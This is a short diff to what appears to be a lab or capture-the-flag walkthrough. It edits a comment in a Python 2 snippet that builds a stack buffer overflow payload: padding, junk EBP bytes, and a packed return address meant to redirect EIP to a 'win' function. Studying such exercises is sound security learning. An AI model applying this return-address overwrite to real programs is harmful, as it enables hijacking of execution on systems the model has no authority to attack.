@@ -50,7 +50,7 @@ import struct
 
 padding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR'
 ebp = 'AAAA' # ebp - junk
-eip = struct.pack('I', 0x080483f4) # eip
+eip = struct.pack('I', 0x080483f4) # eip (win function needs to be here)
 print padding+ebp+eip
 ```
 
